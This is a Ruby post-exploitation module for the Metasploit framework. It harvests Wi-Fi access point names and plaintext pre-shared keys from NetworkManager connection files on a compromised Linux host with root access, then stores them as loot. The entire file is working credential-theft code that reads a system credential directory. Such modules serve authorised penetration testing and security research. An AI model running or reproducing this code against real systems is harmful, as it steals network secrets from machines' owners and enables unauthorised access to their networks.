##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Linux Gather 802-11-Wireless Security Credentials',
      'Description'   => %q{
          This module collects 802-11-Wireless-Security credentials such as
          Access-Point name and Pre-Shared-Key from your target CLIENT Linux
          machine using /etc/NetworkManager/system-connections/ files.
          The module gathers NetworkManager's plaintext "psk" information.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['Cenk Kalpakoglu'],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter']
    ))

    register_options(
      [
        OptString.new('DIR', [true, 'The default path for network connections',
                              '/etc/NetworkManager/system-connections/']
        )
      ], self.class)
  end

  def dir
    datastore['DIR']
  end

  #
  # Extracts AccessPoint name and PSK
  #
  def extract_secrets(data, ap_name)
    data.each_line do |l|
      if l =~ /^psk=/
        psk = l.split('=')[1].strip
        return [ap_name, psk]
      end
    end
    nil
  end

  def run
    if is_root?
      tbl = Rex::Ui::Text::Table.new({
        'Header'  => '802-11-wireless-security',
        'Indent'  => 1,
        'Columns' => ['AccessPoint Name', 'PSK']
      })

      files = cmd_exec("/bin/ls #{dir}").chomp.split
      files.each do |l|
        file = "#{dir}#{l}"
        print_status("Reading file: #{file}")
        # TODO: find better ruby way?
        if data = read_file(file)
          ret = extract_secrets(data, l)
          if ret
            tbl << ret
          end
        end
      end

      if tbl.rows.empty?
        print_status('No PSK has been found!')
      else
        print_line(tbl.to_s)

        p = store_loot(
          'linux.psk.creds',
          'text/csv',
          session,
          tbl.to_csv,
          File.basename('wireless_credentials.txt')
        )
        print_good("Secrets stored in: #{p}")
      end
    else
      print_error('You must run this module as root!')
    end
  end
end
